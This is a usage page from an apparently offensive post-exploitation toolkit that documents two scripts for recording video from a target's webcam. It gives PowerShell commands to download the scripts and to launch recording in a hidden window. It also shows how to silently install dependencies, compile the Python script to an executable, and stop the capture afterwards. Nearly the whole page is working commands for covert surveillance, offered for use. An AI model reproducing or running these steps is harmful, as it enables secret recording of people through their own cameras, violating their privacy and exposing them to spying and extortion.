## WebCam.py

|Script Name|Description|Privileges|Notes|
|---|---|---|---|
|[WebCam](https://github.com/r00t-3xp10it/redpill/blob/main/lib/WebCam-Capture/WebCam.py)|Capture video (AVI) using default target webcam|User Land|Credits: @AHLASaad \ @AvinabSaha<br />[write-a-video-using-opencv-python](https://learnopencv.com/read-write-and-display-a-video-using-opencv-cpp-python)|

<br />

**download script:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WebCam-Capture/WebCam.py" -OutFile "WebCam.py"
```

<br />

**prerequesites checks:**
```powershell
#Check if Pthon its installed
[bool](python -V)

#Check if opencv its installed
[bool](pip list|findstr /C:"opencv-python")

[OPTIONAL] #Install opencv and numpy modules
pip install opencv-python
```

<br />

**execute:**
```powershell
#Search for python 'site-packages' directory
gci "$Env:LOCALAPPDATA\Programs" -Recurse -Force|?{$_.PSIsContainer -Match "True" -and $_.Name -iMatch 'site-packages'}

#Edit WebCam.py and change next cmdline to point to your 'python\site-packages' directory
#Remark: remmenber to add double backslashs to your path ( eg. C:\\path\\path\\path\\path )
sys.path.append("c:\\users\\pedro\\appdata\\local\\programs\\python\\python39\\lib\\site-packages")

#Start capture
Start-Process -WindowStyle hidden python -ArgumentList "WebCam.py"

#Stop capture
Stop-Process -Name "python*" -Force
```

<br />

**Final Notes:**
```powershell
Video recording its stored on WebCam.py current directory under the name: "outpy.avi"
WebCam.py can be compiled to exe using pyinstaller: pyinstaller –onefile "WebCam.py"
```

<br /><br />


## Invoke-WebCamAvi.ps1

|Script Name|Description|Privileges|Notes|
|---|---|---|---|
|[Invoke-WebCamAvi](https://github.com/r00t-3xp10it/redpill/blob/main/lib/WebCam-Capture/Invoke-webcamAvi.ps1)|Capture video (AVI) using default target webcam|User Land|Credits: @AHLASaad \ @AvinabSaha<br />[write-a-video-using-opencv-python](https://learnopencv.com/read-write-and-display-a-video-using-opencv-cpp-python)|

<br />

**download script:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WebCam-Capture/Invoke-webcamAvi.ps1" -OutFile "Invoke-webcamAvi.ps1"
```

<br />

**Prerequesites tests:**
```powershell
#Mandatory requirement
[bool](python -V)
```

<br />

**run cmdlet:**
```powershell
#Get module help
Get-Help .\Invoke-webcamAvi.ps1 -full

#Record webcam live stream for 15 seconds time
.\Invoke-webcamAvi.ps1 -RecTime '15'

#Record webcam live and use %TMP% as working directory
.\Invoke-webcamAvi.ps1 -WorkingDir "$Env:TMP"

#Record webcam live and rename avi file name
.\Invoke-webcamAvi.ps1 -FileName "capture.avi"

#silent install of python3 dependencies if missing.
.\Invoke-WebCamAvi.ps1 -forceinstall
```

<br />

**Final Notes:**
```powershell
Remark: Python its mandatory requiremente to run cmdlet..
Invoke-webcamAvi cmdlet automates the execution of 'WebCam.py' and python packages dependencies.
Video recording (silent) its stored on cmdlet working directory under the name of: "meterpeter.avi"
```
